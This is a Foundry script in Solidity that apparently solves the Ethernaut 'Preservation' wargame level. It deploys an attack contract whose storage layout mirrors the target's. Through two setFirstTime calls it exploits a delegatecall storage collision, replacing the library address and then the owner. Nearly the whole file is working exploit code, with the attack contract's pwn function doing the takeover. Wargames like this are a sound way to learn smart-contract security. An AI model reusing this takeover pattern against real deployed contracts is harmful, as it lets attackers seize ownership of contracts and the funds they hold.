// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation} from "../src/16_Preservation.sol";
import {Script, console} from "forge-std/Script.sol";

contract PreservationSolve is Script {
    Preservation preservation = Preservation(0x7aDb56157A973022FDb182e564C9c6e3AdA12fBf);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner Before#", preservation.owner());
        new Attack().pwn(address(preservation));
        console.log("Owner After#", preservation.owner());

        vm.stopBroadcast();
    }
}

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    uint256 public owner;

    function pwn(address preservationAddr) external {
        Preservation preservation = Preservation(preservationAddr);
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _time) external {
        owner = _time;
    }
}
